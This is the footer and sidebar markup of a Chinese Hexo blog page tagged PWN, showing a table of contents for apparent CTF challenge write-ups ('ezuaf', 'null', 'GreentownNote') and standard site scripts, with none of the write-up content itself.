+    <li><strong>版权声明：</strong>本博客所有文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" title="BY-NC-SA" target="_blank" rel="noopener">BY-NC-SA</a> 许可协议，转载请注明出处！</li>
+  
+</ul>
+        
+        
+        
+  <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWN/" rel="tag">PWN</a></li></ul> 
+
+        
+  <nav class="nav">
+    <a></a>
+    <a href="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/">2021九月DASCTF<i class="iconfont iconright"></i></a>
+  </nav>
+
+      </section>
+      
+        <section class="comments">
+  
+    <div class="btn" id="comments-btn">查看评论</div>
+  
+  
+</section>
+      
+    </section>
+  </div>
+</article></div>
+      <div class="col-xl-3">
+        
+          
+  <aside class="toc-wrap">
+    <h3 class="toc-title">文章目录：</h3>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezuaf"><span class="toc-text">ezuaf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-text">null</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GreentownNote"><span class="toc-text">GreentownNote</span></a></li></ol>
+  </aside>
+
+        
+      </div>
+    </div>
+  </div>
+</main>
+  
+
+<footer class="footer">
+  <div class="footer-social"><a 
+        href="tencent://message/?Menu=yes&uin=1145020611 "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#12B7F5'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconQQ "></i>
+      </a><a 
+        href="javascript:; "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#09BB07'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconwechat-fill "></i>
+      </a><a 
+        href="https://www.instagram.com/izhaoo/ "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#DA2E76'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconinstagram "></i>
+      </a><a 
+        href="https://shoucheng3.github.io "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#9f7be1'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  icongithub-fill "></i>
+      </a><a 
+        href="mailto:1145020611@qq.com "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color=#FF3B00" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconmail"></i>
+      </a></div>
+  
+    <div class="footer-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+  
+</footer>
+  
+      <div class="fab fab-plus">
+    <i class="iconfont iconplus"></i>
+  </div>
+  
+    <div class="fab fab-daovoice">
+      <i class="iconfont iconcomment"></i>
+    </div>
+  
+  
+    <a href="https://support.qq.com/product/325288# app_id" target="_blank">
+      <div class="fab fab-tencent-chao">
+        <i class="iconfont iconcomment"></i>
+      </div>
+    </a>
+  
+  <div class="fab fab-up">
+    <i class="iconfont iconcaret-up"></i>
+  </div>
+  
+  
+  
+    
+<script src="/js/color-mode.js"></script>
+
+  
+  
+    <div class="search">
+  <div class="search-container">
+    <div class="search-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <div class="search-input-wrapper">
+      <i class="search-input-icon iconfont iconsearch"></i>
+      <input class="search-input" type="search" id="search-input" placeholder="Search..." autofocus autocomplete="off"
+        autocorrect="off" autocapitalize="off">
+    </div>
+    <div class="search-output" id="search-output"></div>
+  </div>
+</div>
+  
+</body>
+
+<script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+
+
+
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.qrcode/1.0/jquery.qrcode.min.js"></script>
+
+
+
+
+<script src="/js/utils.js"></script>
+<script src="/js/script.js"></script>
+
+
+
+
+
+  
+
+<script>
+  (function (i, s, o, g, r, a, m) {
+    i["DaoVoiceObject"] = r;
+    i[r] = i[r] || function () {
+      (i[r].q = i[r].q || []).push(arguments)
+    }, i[r].l = 1 * new Date();
+    a = s.createElement(o), m = s.getElementsByTagName(o)[0];
+    a.async = 1;
+    a.src = g;
+    a.charset = "utf-8";
+    m.parentNode.insertBefore(a, m)
+  })(window, document, "script", "https://widget.daovoice.io/widget/0f81ff2f.js", "daovoice")
+  daovoice('init', {
+    app_id: "3abd194f# app_id"
+  }, {
+    launcher: {
+      disableLauncherIcon: true,
+    },
+  });
+  daovoice('update');
+</script>
+
+
+
+  <script>
+    (function () {
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      } else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</html>
